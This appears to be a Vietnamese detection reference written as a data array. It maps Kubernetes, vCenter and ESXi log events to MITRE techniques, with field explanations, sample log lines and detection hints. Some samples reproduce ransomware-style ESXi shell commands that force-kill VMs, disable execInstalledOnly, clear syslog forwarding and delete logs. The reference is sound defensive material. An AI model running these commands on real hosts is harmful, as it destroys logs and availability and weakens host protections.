["k8s-audit","403 forbidden","Bị RBAC từ chối hàng loạt","m","T1069",
 "Dò quyền (kubectl auth can-i, công cụ trinh sát).","verb: hành động bị từ chối (vd \"list\")\nuser.username: tài khoản/ServiceAccount thực hiện request\nobjectRef.resource: loại tài nguyên bị truy vấn (vd \"nodes\")\nresponseStatus.code/reason: 403/\"Forbidden\" — bị RBAC chặn\nannotations[\"authorization.k8s.io/decision\"]: \"forbid\" — quyết định ủy quyền, xác nhận đây là một lần bị từ chối quyền", R`{"verb":"list","user":{"username":"system:serviceaccount:payment:api"},"objectRef":{"resource":"nodes"},"responseStatus":{"code":403,"reason":"Forbidden"},"annotations":{"authorization.k8s.io/decision":"forbid"}}`, "Một danh tính nhận nhiều 403 trên nhiều loại resource trong vài phút.", ""],


["k8s-audit","serviceaccounts/token","Tạo token cho ServiceAccount","m","T1528",
 "TokenRequest API; kẻ tấn công dùng để lấy token SA có quyền cao.","verb: \"create\" — gọi TokenRequest API để sinh token mới\nuser.username: người/tài khoản yêu cầu cấp token\nobjectRef.resource/subresource: resource=\"serviceaccounts\", subresource=\"token\"\nobjectRef.namespace/name: namespace và tên ServiceAccount được cấp token (đáng chú ý nếu SA có quyền cao, vd trong kube-system)\nresponseStatus.code: 201 — token được tạo thành công", R`{"verb":"create","user":{"username":"thanhnv"},"objectRef":{"resource":"serviceaccounts","subresource":"token","namespace":"kube-system","name":"cluster-admin-sa"},"responseStatus":{"code":201}}`, "", ""],


["k8s-audit","portforward / proxy","Port-forward hoặc proxy","m","",
 "Mở đường vào service nội bộ từ máy quản trị.","verb: \"create\" — mở kết nối port-forward hoặc proxy\nuser.username: người dùng thực hiện\nobjectRef.resource/subresource: resource=\"pods\" (hoặc \"services\"), subresource=\"portforward\"/\"proxy\"\nobjectRef.namespace/name: pod/service đích được forward tới\nresponseStatus.code: 101 — kết nối đường hầm được thiết lập (Switching Protocols)", R`{"verb":"create","user":{"username":"thanhnv"},"objectRef":{"resource":"pods","subresource":"portforward","namespace":"db","name":"postgres-0"},"responseStatus":{"code":101}}`, "", ""],


["k8s-audit","delete events","Xóa Events","m","T1070",
 "Xóa dấu vết vận hành.","verb: \"deletecollection\" (hoặc \"delete\") — xóa toàn bộ hoặc một event\nuser.username: tài khoản thực hiện xóa\nobjectRef.resource/namespace: resource=\"events\", namespace bị xóa events\nresponseStatus.code: 200 — xóa thành công", R`{"verb":"deletecollection","user":{"username":"thanhnv"},"objectRef":{"resource":"events","namespace":"payment"},"responseStatus":{"code":200}}`, "", ""],


["k8s-audit","kube-system workload","Tạo DaemonSet/CronJob trong kube-system","m","T1053.007, T1543.005",
 "Persistence chạy trên mọi node hoặc theo lịch.","verb: \"create\"\nuser.username: tài khoản thực hiện tạo workload\nobjectRef.resource/apiGroup: resource=\"daemonsets\" (apiGroup=\"apps\") hoặc \"cronjobs\" (apiGroup=\"batch\")\nobjectRef.namespace: \"kube-system\" — namespace nhạy cảm, workload chạy trên mọi node hoặc theo lịch với quyền cao\nobjectRef.name: tên object được tạo\nresponseStatus.code: 201 — tạo thành công", R`{"verb":"create","user":{"username":"thanhnv"},"objectRef":{"resource":"daemonsets","apiGroup":"apps","namespace":"kube-system","name":"node-helper"},"responseStatus":{"code":201}}`, "", ""],



/* ===== K8s component ===== */
["k8s-comp","kubelet","kubelet log","i","",
 "journald trên node; klog format.","Oct 24 02:11:05 worker-01: timestamp và tên node do journald/syslog gắn vào\nkubelet[1422]: tên tiến trình và PID của kubelet trên node\nE1024 02:11:05.123456: ký tự đầu là mức log klog (E=Error, I=Info, W=Warning, F=Fatal), theo sau là ngày giờ nội bộ\nthreadid (\"1422\" sau timestamp): mã luồng ghi log của klog\npod_workers.go:1298: file mã nguồn và dòng phát sinh log\nmessage/err/pod: nội dung log và các trường ngữ cảnh — ở đây cho biết pod/container nào lỗi (CrashLoopBackOff)", R`Oct 24 02:11:05 worker-01 kubelet[1422]: E1024 02:11:05.123456    1422 pod_workers.go:1298] "Error syncing pod, skipping" err="failed to \"StartContainer\" for \"api\" with CrashLoopBackOff" pod="payment/api-7d9f"`, "Kubelet API (10250) không log request mặc định; bảo vệ bằng --anonymous-auth=false và --authorization-mode=Webhook.", R`journalctl -u kubelet --since "1 hour ago" --no-pager | tail -100`],


["k8s-comp","container log","Log container (CRI format)","i","",
 "Mỗi dòng: thời gian, stream (stdout/stderr), cờ P (partial) hoặc F (full), nội dung.","timestamp: \"2026-10-24T02:11:05.123456789Z\" — thời điểm ghi log theo RFC3339Nano\nstream: \"stdout\"/\"stderr\" — luồng xuất của tiến trình trong container\ntag: \"F\" (full - dòng log đầy đủ) hoặc \"P\" (partial - dòng bị cắt, sẽ được nối tiếp ở dòng sau)\nlog content: phần còn lại của dòng — nội dung log do ứng dụng trong container tự ghi ra (ở đây là JSON do app log)", R`2026-10-24T02:11:05.123456789Z stdout F {"level":"info","msg":"login ok","user":"thanhnv","ip":"10.20.5.23"}`, "", R`ls /var/log/pods/payment_api-7d9f_*/api/`],


["k8s-comp","kube-apiserver","Process log của API server","m","",
 "Lỗi xác thực, webhook, etcd.","E (ký tự đầu): mức log klog — Error\n1024 02:10:11.120345: ngày giờ nội bộ klog (mmdd hh:mm:ss.microsec)\nthreadid (\"1\"): mã luồng ghi log của tiến trình kube-apiserver\nauthentication.go:73: file mã nguồn và dòng phát sinh log\nmessage: \"Unable to authenticate the request\" — mô tả lỗi\nerr: chi tiết nguyên nhân (vd bearer token không hợp lệ hoặc token của ServiceAccount đã hết hạn)", R`E1024 02:10:11.120345       1 authentication.go:73] "Unable to authenticate the request" err="[invalid bearer token, service account token has expired]"`, "Nhiều lỗi invalid bearer token: token cũ/bị đánh cắp đang được thử.", ""],


["k8s-comp","etcd","etcd log","m","T1552",
 "Kết nối TLS bị từ chối tới etcd.","level: mức log (\"warn\") trong định dạng zap JSON của etcd\nts: thời gian theo chuẩn RFC3339\ncaller: file:line trong mã nguồn etcd phát sinh log\nmsg: mô tả sự kiện (\"rejected connection\")\nremote-addr: địa chỉ IP:port của client cố kết nối tới etcd\nerror: lý do từ chối (vd thiếu client certificate khi mTLS bắt buộc)", R`{"level":"warn","ts":"2026-10-24T02:12:00.001Z","caller":"embed/config_logging.go:160","msg":"rejected connection","remote-addr":"10.128.0.55:51522","server-name":"","error":"tls: client didn't provide a certificate"}`, "Có kết nối tới 2379/2380 từ ngoài control plane.", ""],


["k8s-comp","containerd","Container runtime log","i","",
 "journalctl -u containerd hoặc crio.","time: thời gian theo chuẩn RFC3339 do containerd ghi\nlevel: mức log (info/warn/error)\nmsg: hành động được thực hiện (vd \"PullImage\")\ntên image/đối tượng trong msg: image hoặc container liên quan tới hành động (vd \"docker.io/library/alpine:latest\")", R`Oct 24 02:11:00 worker-01 containerd[980]: time="2026-10-24T02:11:00.501Z" level=info msg="PullImage \"docker.io/library/alpine:latest\""`, "", ""],



/* ===== K8s events ===== */
["k8s-ev","Pulled (registry lạ)","Kéo image từ registry ngoài danh sách","h","T1610, T1496",
 "Event Normal nhưng có giá trị bảo mật.","NAMESPACE: namespace chứa object liên quan (involvedObject.namespace)\nLAST SEEN: thời gian kể từ lastTimestamp của event (lastTimestamp/count)\nTYPE: loại event — Normal/Warning\nREASON: lý do ngắn gọn (\"Pulled\")\nOBJECT: kind/name của involvedObject liên quan\nMESSAGE: nội dung chi tiết — ở đây ghi rõ registry và tên image được kéo về (cần đối chiếu danh sách registry được phép)", R`NAMESPACE  LAST SEEN  TYPE    REASON  OBJECT          MESSAGE
payment    2m         Normal  Pulled  pod/x-5b8c      Successfully pulled image "docker.io/xmrig/xmrig:latest" in 4.1s`, "Image từ Docker Hub công khai trong môi trường chỉ dùng registry nội bộ; tên chứa xmrig, miner; tag latest.", ""],


["k8s-ev","BackOff","CrashLoopBackOff","i","",
 "Container khởi động lỗi liên tục.","NAMESPACE: namespace của pod liên quan\nLAST SEEN: thời gian kể từ lần event cuối được ghi nhận\nTYPE: \"Warning\"\nREASON: \"BackOff\" — kubelet đang giãn thời gian trước khi restart container tiếp theo\nOBJECT: pod liên quan (involvedObject)\nMESSAGE: mô tả container/pod nào bị restart liên tục và vì sao", R`payment  1m  Warning  BackOff  pod/api-7d9f  Back-off restarting failed container api in pod api-7d9f_payment`, "", ""],


["k8s-ev","FailedScheduling","Không thể xếp lịch pod","i","",
 "Thiếu tài nguyên, taint, affinity.","NAMESPACE: namespace của pod chưa được xếp lịch\nLAST SEEN: thời gian kể từ lần event cuối được ghi nhận\nTYPE: \"Warning\"\nREASON: \"FailedScheduling\" — scheduler không tìm được node phù hợp\nOBJECT: pod liên quan (involvedObject)\nMESSAGE: lý do cụ thể từng node bị loại (thiếu CPU, taint chưa được toleration...)", R`payment  30s  Warning  FailedScheduling  pod/api-7d9f  0/5 nodes are available: 2 Insufficient cpu, 3 node(s) had untolerated taint {node-role.kubernetes.io/master: }.`, "", ""],


["k8s-ev","OOMKilling / Evicted","Container bị kill do bộ nhớ / pod bị evict","m","T1496",
 "Có thể do cryptominer hoặc DoS.","NAMESPACE: namespace của pod bị ảnh hưởng\nLAST SEEN: thời gian kể từ lần event cuối được ghi nhận\nTYPE: \"Warning\"\nREASON: \"Evicted\" (hoặc OOMKilling) — pod/container bị kill do thiếu tài nguyên\nOBJECT: pod liên quan (involvedObject)\nMESSAGE: lý do cụ thể — ngưỡng tài nguyên và lượng còn khả dụng tại thời điểm evict", R`payment  5m  Warning  Evicted  pod/api-7d9f  The node was low on resource: memory. Threshold quantity: 100Mi, available: 81Mi.`, "", ""],



/* ===== vCenter events ===== */
["vc-ev","UserLoginSessionEvent","Đăng nhập vCenter thành công","m","T1078",
 "vim.event.UserLoginSessionEvent.", "userName, ipAddress, userAgent", R`vim.event.UserLoginSessionEvent: User CORP\adm_thanh@10.20.5.23 logged in as VMware vSphere Client/8.0.2`, "Đăng nhập từ IP ngoài dải quản trị; userAgent là pyvmomi/PowerCLI từ máy trạm thường; administrator@vsphere.local dùng ngoài break-glass.", ""],


["vc-ev","BadUsernameSessionEvent","Đăng nhập vCenter thất bại","h","T1110",
 "vim.event.BadUsernameSessionEvent.","eventTypeId: loại sự kiện (vim.event.BadUsernameSessionEvent) – đăng nhập SSO thất bại do sai username/mật khẩu\nfullFormattedMessage: nội dung mô tả, chứa username đích và IP nguồn dạng \"Cannot login <user>@<IP>\"\nuserName: thường rỗng vì phiên chưa được tạo; username bị dò nằm trong fullFormattedMessage\ncreatedTime: thời điểm vCenter ghi nhận sự kiện\nchainId/key: ID để gom nhóm các lần đăng nhập sai liên tiếp từ cùng nguồn", R`vim.event.BadUsernameSessionEvent: Cannot login administrator@vsphere.local@10.30.1.99`, "", ""],


["vc-ev","UserLogoutSessionEvent","Đăng xuất vCenter","i","",
 "Kèm số lượng call API trong phiên.","userName: tài khoản đăng xuất (vd CORP\\adm_thanh)\nipAddress: IP client của phiên làm việc\nloginTime: thời điểm đăng nhập ban đầu của phiên\ncallCount: số lượng API call thực hiện trong phiên (bất thường nếu quá cao)\nuserAgent: client dùng để kết nối (vSphere Client, PowerCLI, govc...)\nsessionId: ID phiên, dùng để tra cứu hoạt động cùng phiên trong log khác", R`vim.event.UserLogoutSessionEvent: User CORP\adm_thanh@10.20.5.23 logged out (login time: ..., number of API invocations: 1532, user agent: VMware vSphere Client/8.0.2)`, "Số API invocation rất lớn trong phiên ngắn: script tự động hóa hoặc trinh sát.", ""],


["vc-ev","PermissionAddedEvent","Gán quyền trên inventory","h","T1098",
 "vim.event.PermissionAddedEvent; tương tự PermissionUpdatedEvent, PermissionRemovedEvent.","entity: đối tượng inventory được gán quyền (vd Datacenters, folder, VM)\nrole: role được gán (tên/role ID, vd Administrator)\nusername: tài khoản hoặc nhóm được cấp quyền (vd CORP\\svc_backup2)\ngroup: cờ true/false cho biết principal là user hay group\npropagate: quyền có lan truyền xuống object con hay không\nuserName: tài khoản thực hiện thao tác gán quyền (actor)", R`vim.event.PermissionAddedEvent: Permission created for CORP\svc_backup2 on Datacenters, role is Administrator, propagation is Enabled`, "Role Administrator ở cấp root/Datacenter cho user mới hoặc nhóm rộng.", ""],


["vc-ev","RoleAddedEvent / RoleUpdatedEvent","Tạo / sửa role","m","T1098",
 "Role mới hoặc thêm privilege vào role.","role: tên và ID của role bị tạo/sửa (vd Operator)\nprivilegesAdded: danh sách privilege được thêm vào role (chỉ có ở RoleUpdatedEvent)\nprivilegesRemoved: danh sách privilege bị gỡ khỏi role (chỉ có ở RoleUpdatedEvent)\nuserName: tài khoản thực hiện thay đổi role\ncreatedTime: thời điểm thay đổi", R`vim.event.RoleUpdatedEvent: Role Operator modified. Privileges added: VirtualMachine.Provisioning.GetVmFiles, VirtualMachine.GuestOperations.Execute`, "", ""],


["vc-ev","VmPoweredOffEvent","VM bị tắt","m","T1529",
 "vim.event.VmPoweredOffEvent.","vm: tên và moref của VM bị tắt (vd SRV-DB01)\nhost: ESXi host đang chạy VM\ndatacenter: datacenter chứa VM\nuserName: tài khoản thực hiện power off (rỗng nếu do hệ thống/HA)\ncreatedTime: thời điểm sự kiện xảy ra", R`vim.event.VmPoweredOffEvent: SRV-DB01 on esx-dc-03.corp.local in DC-HN is powered off`, "Nhiều VM tắt liên tiếp ngoài lịch: dấu hiệu chuẩn bị mã hóa datastore.", ""],


["vc-ev","VmRemovedEvent","VM bị xóa","h","T1485",
 "vim.event.VmRemovedEvent.","vm: tên VM bị xóa (vd SRV-APP07)\nhost: ESXi host nơi VM từng chạy\ndatacenter: datacenter chứa VM\nuserName: tài khoản thực hiện xóa VM\ncreatedTime: thời điểm xóa", R`vim.event.VmRemovedEvent: Removed SRV-APP07 on esx-dc-02.corp.local from DC-HN`, "", ""],


["vc-ev","VmReconfiguredEvent","VM bị cấu hình lại","m","T1003.003, T1005",
 "Thêm/bớt disk, gắn ISO, đổi network.","vm: VM bị cấu hình lại (vd TMP-VM01)\nconfigSpec: nội dung thay đổi, hiển thị dạng \"Modified: <đường dẫn thuộc tính>: <giá trị cũ> -> <giá trị mới>\" (vd gắn thêm ổ đĩa, đổi network)\nhost/datacenter: vị trí VM\nuserName: tài khoản thực hiện thay đổi cấu hình\ncreatedTime: thời điểm thay đổi", R`vim.event.VmReconfiguredEvent: Reconfigured TMP-VM01 on esx-dc-03.corp.local in DC-HN. Modified: config.hardware.device(2001).backing.fileName: "" -> "[DS-PROD-01] DC01/DC01.vmdk"`, "Gắn VMDK của Domain Controller vào VM khác: cách đánh cắp NTDS.dit không chạm vào DC.", ""],


["vc-ev","VmClonedEvent","Clone VM","m","T1578.002",
 "vim.event.VmClonedEvent / VmBeingClonedEvent.","vm: VM bản clone mới tạo ra (vd DC01-copy)\nsourceVm: VM gốc dùng để clone (vd SRV-DC01)\nhost/datacenter: nơi VM clone được đặt\nuserName: tài khoản thực hiện clone\ncreatedTime: thời điểm clone", R`vim.event.VmClonedEvent: SRV-DC01 cloned to DC01-copy on esx-dc-03.corp.local in DC-HN`, "Clone DC, DB server hoặc HSM VM.", ""],


["vc-ev","Snapshot tasks","Tạo / xóa snapshot","m","T1490",
 "TaskEvent với tác vụ snapshot.","info.descriptionId: loại tác vụ (vd vm.Snapshot.removeAll, vm.Snapshot.create)\ninfo.entityName: tên VM/đối tượng bị tác động\ninfo.reason: cho biết tác vụ do user nào khởi tạo (\"initiated by\")\ninfo.state/info.result: trạng thái và kết quả tác vụ (success/error)\ninfo.startTime/completeTime: thời gian bắt đầu/kết thúc tác vụ", R`vim.event.TaskEvent: Task: Remove all snapshots on SRV-DB01 (initiated by CORP\adm_x)`, "Xóa toàn bộ snapshot nhiều VM: phá khả năng khôi phục.", ""],


["vc-ev","GuestOperation","Thao tác trong guest qua VMware Tools","m","T1059",
 "com.vmware.vc.guestOperations.GuestOperation: chạy chương trình/đẩy file vào guest không qua mạng.","eventTypeId: com.vmware.vc.guestOperations.GuestOperation\nvm: VM mà thao tác guest được thực hiện trên đó (vd SRV-APP01)\nuserName: tài khoản thực hiện guest operation (credential dùng trong guest, không phải vSphere login)\narguments/message: loại thao tác cụ thể (Start Program, Transfer File, List Directory...)\ncreatedTime: thời điểm thực hiện", R`com.vmware.vc.guestOperations.GuestOperation: Guest operation Start Program performed on Virtual machine SRV-APP01.`, "Lateral movement không đi qua network: không thấy trên firewall/EDR mạng.", ""],


["vc-ev","esx.audit.ssh.enabled","Bật SSH / ESXi Shell trên host","h","T1021.004",
 "Sự kiện từ host đẩy lên vCenter.","eventTypeId: mã sự kiện host đẩy lên vCenter (vd esx.audit.ssh.enabled, esx.audit.shell.enabled)\nhost: ESXi host phát sinh sự kiện\nuserName: tài khoản thực hiện bật dịch vụ (thường root hoặc vpxuser nếu qua vCenter)\nfullFormattedMessage: nội dung mô tả (SSH/Shell access has been enabled)\ncreatedTime: thời điểm sự kiện", R`esx.audit.ssh.enabled: SSH access has been enabled.
esx.audit.shell.enabled: The ESXi command line shell has been enabled.`, "SSH bật ngoài cửa sổ bảo trì là bước đầu thường gặp trong tấn công ransomware ESXi.", ""],


["vc-ev","HostConnectionLostEvent","Mất kết nối tới host","m","",
 "vim.event.HostConnectionLostEvent / HostDisconnectedEvent.","host: ESXi host bị mất kết nối\ndatacenter: datacenter chứa host\nfullFormattedMessage: nội dung mô tả (host is not responding)\ncreatedTime: thời điểm phát hiện mất kết nối\nuserName: thường rỗng vì đây là sự kiện hệ thống tự phát hiện", R`vim.event.HostConnectionLostEvent: Host esx-dc-03.corp.local in DC-HN is not responding`, "", ""],



/* ===== vCenter SSO ===== */
["vc-sso","LoginFailure","SSO đăng nhập thất bại","h","T1110",
 "audit_events.log, JSON mỗi dòng.","user: tài khoản SSO đăng nhập (vd administrator@vsphere.local)\nclient: IP nguồn thực hiện đăng nhập\ntimestamp: thời điểm sự kiện (giờ GMT)\ndescription: nội dung chi tiết, gồm user@IP và lý do thất bại (vd Invalid credentials)\ntype: loại sự kiện SSO (com.vmware.sso.LoginFailure)\neventSeverity: mức độ (thường INFO ngay cả khi login thất bại)", R`{"user":"administrator@vsphere.local","client":"10.30.1.99","timestamp":"10/24/2026 02:20:11 GMT","description":"User administrator@vsphere.local@10.30.1.99 failed to log in: Invalid credentials","eventSeverity":"INFO","type":"com.vmware.sso.LoginFailure"}`, "", ""],


["vc-sso","LoginSuccess","SSO đăng nhập thành công","m","T1078",
 "","user: tài khoản SSO đăng nhập thành công (vd adm_thanh@corp.local)\nclient: IP nguồn thực hiện đăng nhập\ntimestamp: thời điểm sự kiện (giờ GMT)\ndescription: nội dung chi tiết, gồm user@IP và response code (vd response code 200)\ntype: loại sự kiện SSO (com.vmware.sso.LoginSuccess)\neventSeverity: mức độ (thường INFO)", R`{"user":"adm_thanh@corp.local","client":"10.20.5.23","timestamp":"10/24/2026 02:21:00 GMT","description":"User adm_thanh@corp.local@10.20.5.23 logged in with response code 200","eventSeverity":"INFO","type":"com.vmware.sso.LoginSuccess"}`, "", ""],


["vc-sso","PrincipalManagement","Quản lý user/nhóm SSO","h","T1136, T1098",
 "Tạo user local SSO, thêm vào nhóm Administrators.","user: tài khoản thực hiện thao tác quản trị SSO (actor)\nclient: IP nguồn thực hiện thao tác\ndescription: nội dung thao tác (vd thêm principal vào group Administrators)\ntype: com.vmware.sso.PrincipalManagement\ntimestamp: thời điểm thực hiện", R`{"user":"administrator@vsphere.local","client":"10.30.1.99","description":"Add principal svcbk@vsphere.local to group Administrators","type":"com.vmware.sso.PrincipalManagement"}`, "User vsphere.local mới, nhất là được thêm vào Administrators.", ""],



/* ===== vCenter files ===== */
["vc-file","vpxd.log","Log dịch vụ vCenter (vpxd)","i","",
 "Mỗi tác vụ có BEGIN/FINISH task kèm opID.","timestamp: thời gian ghi log (ISO8601, có timezone)\nloglevel/process[pid]: mức log (info/warning/error) và tiến trình vpxd kèm PID\nsub=: subsystem phát sinh log (vd vpxLro = long-running operation)\nopID=: operation ID, dùng để nối các dòng log liên quan tới cùng thao tác qua nhiều service\ntask-NNNN: ID tác vụ vCenter (BEGIN/FINISH đánh dấu bắt đầu/kết thúc)\nvim.VirtualMachine.powerOff: tên API/operation được gọi, kèm moref đối tượng (vm-1021) và UUID actor/session", R`2026-10-24T02:15:01.234+07:00 info vpxd[12345] [Originator@6876 sub=vpxLro opID=lro-881232] [VpxLRO] -- BEGIN task-91234 -- vm-1021 -- vim.VirtualMachine.powerOff -- 52e1a3c4-...(52f3b1aa-...)`, "Dùng opID để nối hành động trên UI với hostd.log trên ESXi.", ""],


["vc-file","VCSA OS / SSH","Đăng nhập shell vào appliance","m","T1021.004",
 "Log hệ điều hành Photon của VCSA; vị trí cụ thể phụ thuộc phiên bản (journald, /var/log/messages, /var/log/audit/).","timestamp: thời gian ghi log (định dạng syslog)\nhostname: tên appliance VCSA (vd vcsa01)\nprocess[pid]: tiến trình sshd và PID xử lý kết nối\nAccepted/Failed password/publickey for: kết quả xác thực và tài khoản đăng nhập (vd root)\nfrom <IP> port <port>: IP nguồn và cổng kết nối\nssh2: giao thức phiên", R`Oct 24 02:30:01 vcsa01 sshd[30211]: Accepted password for root from 10.30.1.99 port 50211 ssh2`, "SSH vào VCSA ngoài quy trình; lệnh lạ trong bash history của root.", R`journalctl -u sshd --no-pager | tail -50`],



/* ===== ESXi files ===== */
["esx-file","auth.log success","SSH vào ESXi thành công","m","T1021.004",
 "/var/log/auth.log.","timestamp: Thời điểm sự kiện (UTC, ISO 8601) ở đầu dòng auth.log\nsshd[pid]: Tiến trình SSH daemon và PID xử lý phiên đăng nhập\nAccepted <method>: Xác thực thành công và phương thức dùng (keyboard-interactive/pam, publickey, password...)\nfor <user>: Tài khoản dùng để đăng nhập (vd. root)\nfrom <IP>: Địa chỉ IP nguồn thực hiện kết nối SSH\nport <port> ssh2: Cổng TCP nguồn phía client và giao thức SSH2", R`2026-10-24T02:31:00Z sshd[2101012]: Accepted keyboard-interactive/pam for root from 10.30.1.99 port 50322 ssh2`, "", ""],


["esx-file","auth.log failed","SSH vào ESXi thất bại","h","T1110",
 "","timestamp: Thời điểm ghi log (UTC)\nsshd[pid]: Tiến trình SSH daemon và PID xử lý phiên\nerror: PAM: Authentication failure: Thông báo PAM xác thực thất bại\nfor <user>: Tài khoản bị từ chối đăng nhập (vd. root)\nfrom <IP>: Địa chỉ IP nguồn thực hiện thử đăng nhập", R`2026-10-24T02:30:41Z sshd[2101010]: error: PAM: Authentication failure for root from 10.30.1.99`, "", ""],


["esx-file","shell.log enum/kill","Liệt kê và tắt VM bằng lệnh","c","T1529, T1486",
 "/var/log/shell.log ghi từng lệnh ESXi Shell. Chuỗi này rất đặc trưng cho ransomware ESXi.","timestamp: Thời điểm thực thi lệnh (UTC), mỗi dòng shell.log là một lệnh\nshell[pid]: Tiến trình ESXi Shell (busybox) và PID của phiên\n[user]: Tài khoản đang gõ lệnh trong ESXi Shell (vd. root)\ncommand: Toàn bộ dòng lệnh được thực thi (vim-cmd vmsvc/getallvms, esxcli vm process list, esxcli vm process kill)\n--world-id=<id>: ID world (tiến trình chạy) của VM mục tiêu bị buộc tắt\n--type=force: Chế độ kill cưỡng bức, không chờ VM tắt bình thường", R`2026-10-24T02:31:07Z shell[2103311]: [root]: vim-cmd vmsvc/getallvms
2026-10-24T02:31:20Z shell[2103311]: [root]: esxcli vm process list
2026-10-24T02:31:41Z shell[2103311]: [root]: esxcli vm process kill --type=force --world-id=1052211`, "Theo sau thường là tải binary vào /tmp, chmod +x và chạy với tham số trỏ /vmfs/volumes.", ""],


["esx-file","execInstalledOnly","Tắt chặn thực thi binary ngoài VIB","c","T1562.001",
 "Cho phép chạy binary tự mang vào (encryptor).","timestamp: Thời điểm thực thi lệnh (UTC)\nshell[pid]: Tiến trình ESXi Shell và PID của phiên\n[user]: Tài khoản thực thi lệnh (vd. root)\nesxcli system settings kernel set: Lệnh thay đổi tham số kernel ESXi\n-s execInstalledOnly: Tên tham số kernel kiểm soát chỉ cho phép chạy binary từ VIB đã ký/cài hợp lệ\n-v FALSE: Giá trị mới, tắt kiểm soát để cho phép chạy binary tuỳ ý (vd. mã mã hoá ransomware)", R`2026-10-24T02:32:02Z shell[2103311]: [root]: esxcli system settings kernel set -s execInstalledOnly -v FALSE`, "", ""],


["esx-file","log tampering","Xóa log / tắt forward syslog","c","T1070, T1562",
 "","timestamp: Thời điểm thực thi lệnh (UTC)\nshell[pid]: Tiến trình ESXi Shell và PID của phiên\n[user]: Tài khoản thực thi lệnh (vd. root)\nesxcli system syslog config set --loghost='': Xóa cấu hình remote syslog host, ngắt việc forward log ra ngoài\nrm -f /var/log/*.log: Lệnh xóa toàn bộ file log cục bộ trên ESXi", R`2026-10-24T02:33:10Z shell[2103311]: [root]: esxcli system syslog config set --loghost=''
2026-10-24T02:33:15Z shell[2103311]: [root]: rm -f /var/log/*.log`, "Syslog từ host ngừng đột ngột trên SIEM là tín hiệu cần cảnh báo (heartbeat/log-gap).", ""],


["esx-file","hostd.log login","Đăng nhập Host Client / API vào ESXi","m","T1078",
 "/var/log/hostd.log.","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ninfo: Mức độ log của hostd\nhostd[pid]: Tiến trình host agent (hostd) và PID\nOriginator@6876 sub=Vimsvc.ha-eventmgr: Thành phần/subsystem phát sinh sự kiện (event manager của hostd)\nEvent <id>: Mã sự kiện VIM (2211 = đăng nhập thành công)\nUser <user>@<IP> logged in as <client>: Tài khoản, IP nguồn và client/user-agent dùng để đăng nhập (Host Client, API, PowerCLI...)", R`2026-10-24T02:29:58.112Z info hostd[2099681] [Originator@6876 sub=Vimsvc.ha-eventmgr] Event 2211 : User root@10.30.1.99 logged in as Mozilla/5.0 (Windows NT 10.0; Win64; x64)`, "Đăng nhập trực tiếp host (bỏ qua vCenter) khi host lẽ ra ở lockdown mode.", ""],


["esx-file","hostd.log failed","Đăng nhập ESXi thất bại (hostd)","h","T1110",
 "","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ninfo: Mức độ log của hostd\nhostd[pid]: Tiến trình host agent (hostd) và PID\nOriginator@6876 sub=Vimsvc.ha-eventmgr: Thành phần phát sinh sự kiện (event manager của hostd)\nEvent <id>: Mã sự kiện VIM (2208 = đăng nhập thất bại)\nCannot login <user>@<IP>: Tài khoản và IP nguồn bị từ chối đăng nhập", R`2026-10-24T02:29:40.001Z info hostd[2099681] [Originator@6876 sub=Vimsvc.ha-eventmgr] Event 2208 : Cannot login root@10.30.1.99`, "", ""],


["esx-file","vmkernel.log","Log VMkernel","i","",
 "Lưu trữ, mạng, phần cứng.","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ncpuN:worldID: Lõi CPU xử lý và world ID (tiến trình/luồng kernel) phát sinh log\nWARNING: Mức độ nghiêm trọng của thông điệp VMkernel (WARNING/ALERT/INFO...)\nNMP: Tên module/subsystem VMkernel liên quan (vd. Native Multipathing cho đường dẫn lưu trữ)\nnmp_DeviceRequestFastDeviceProbe:237: Hàm và dòng mã nguồn kernel phát sinh log, dùng tra cứu KB\nmessage: Nội dung chi tiết (vd. thiết bị lưu trữ 'naa....' đổi trạng thái path)", R`2026-10-24T03:00:12.441Z cpu12:2097321)WARNING: NMP: nmp_DeviceRequestFastDeviceProbe:237: NMP device "naa.600..." state in doubt; requested fast path state update...`, "", ""],


["esx-file","esxupdate.log","Cài VIB / cập nhật","m","T1505",
 "/var/log/esxupdate.log.","timestamp: Thời điểm ghi log (UTC)\nesxupdate: Tên tiến trình ghi log quản lý cài đặt/cập nhật VIB, image profile\npid: PID của tiến trình esxupdate (vd. 2103400)\nuser: Tài khoản thực hiện thao tác cài đặt/cập nhật (vd. root)\nINFO: Mức độ log\nCommand = <lệnh>: Lệnh esxcli/esxupdate được thực thi (vd. profile.install với --no-sig-check bỏ qua kiểm tra chữ ký)", R`2026-10-24T02:40:00Z esxupdate: 2103400: root: INFO: Command = profile.install ... --no-sig-check`, "VIB cài với --no-sig-check hoặc acceptance level CommunitySupported trên host production.", R`esxcli software vib list | grep -v VMware`],



/* ===== ESXi events ===== */
["esx-ev","esx.audit.account.locked","Tài khoản local bị khóa","h","T1110",
 "/var/log/vobd.log.","timestamp: Thời điểm ghi log VOB (UTC)\n[UserLevelCorrelator]: Thành phần vobd tương quan sự kiện cấp người dùng\n[esx.audit.account.locked]: Tên sự kiện audit VOB — tài khoản local bị khóa\nuser account 'root': Tài khoản local bị khóa\nlocked for <N> seconds: Thời gian khóa tài khoản (giây, mặc định 900s)\nafter <N> failed login attempts: Số lần đăng nhập sai dẫn đến việc khóa tài khoản", R`2026-10-24T02:30:45.001Z: [UserLevelCorrelator] 1532211234us: [esx.audit.account.locked] Remote access for ESXi local user account 'root' has been locked for 900 seconds after 10 failed login attempts.`, "", ""],


["esx-ev","esx.audit.lockdownmode.disabled","Tắt lockdown mode","c","T1562",
 "Host không còn bị buộc quản lý qua vCenter.","timestamp: Thời điểm ghi log VOB (UTC)\n[UserLevelCorrelator]: Thành phần vobd tương quan sự kiện\n[esx.audit.lockdownmode.disabled]: Tên sự kiện audit VOB — lockdown mode bị tắt\nAdministrator access to the host has been enabled: Nội dung thông báo xác nhận quyền truy cập quản trị trực tiếp (root qua SSH/DCUI/API cục bộ) đã được bật lại, tức lockdown mode đã bị tắt", R`2026-10-24T02:28:10.000Z: [UserLevelCorrelator] ...: [esx.audit.lockdownmode.disabled] Administrator access to the host has been enabled.`, "", ""],


["esx-ev","esx.audit.esximage.install.novalidation","Cài image bỏ qua kiểm tra chữ ký","c","T1505, T1601",
